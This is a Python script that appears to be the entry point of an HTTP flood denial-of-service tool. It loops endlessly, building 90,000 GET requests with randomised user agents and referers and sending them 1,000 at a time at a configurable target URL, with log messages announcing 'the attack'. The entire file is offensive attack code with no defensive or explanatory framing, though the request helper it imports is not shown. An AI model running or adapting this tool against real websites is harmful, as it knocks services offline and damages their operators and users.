# Libraries
import time
import random

# Internal packages
from utils.files import Files
from utils.messages import Messages
from core.slowreq import Slowreq

# Constants
VERBOSE = True
TOTAL_REQUESTS = 90000
CONCURRENT_REQUESTS = 1000

METHOD = "GET"
TARGET_URL = "https://example.com"
WAIT_TIME = 5
TIMEOUT = 30
USER_AGENTS = Files.read_file("files/user-agents.txt")
REFERERS = Files.read_file("files/referers.txt")


# Objects
msg = Messages(verbose=VERBOSE)

# Main function
if __name__ == "__main__":
    # Show initial message
    msg.show_info(f"Starting the attack on {TARGET_URL}...")
    msg.show_info(f"Sending {TOTAL_REQUESTS} requests each {WAIT_TIME} seconds...\n")

    # Main loop
    try:
        while True:
            # Create requests
            msg.show_info(f"Creating {TOTAL_REQUESTS} requests...")
            requests_list = [
                Slowreq(
                    METHOD,
                    TARGET_URL,
                    TIMEOUT,
                    random.choice(USER_AGENTS),
                    random.choice(REFERERS),
                )
                for n in range(TOTAL_REQUESTS)
            ]
            msg.show_success("Requests created successfully.\n")

            # Send requests
            msg.show_info(f"Sending {CONCURRENT_REQUESTS} requests...")
            for index, response in Slowreq.send_group(
                requests_list, CONCURRENT_REQUESTS
            ):
                try:
                    if response.status_code == 200:
                        msg.show_success(f"The request {index} was sent successfully.")
                except AttributeError:
                    msg.show_error(f"The request {index} could not be sent.")

            # Wait before continuing
            del requests_list
            msg.show_info(f"Waiting {WAIT_TIME} seconds before continuing...\n")
            time.sleep(WAIT_TIME)
    except KeyboardInterrupt:
        msg.show_warning("The process has been stopped.")
    except Exception as error:
        msg.show_error(f"An unexpected error occurred: {error}")
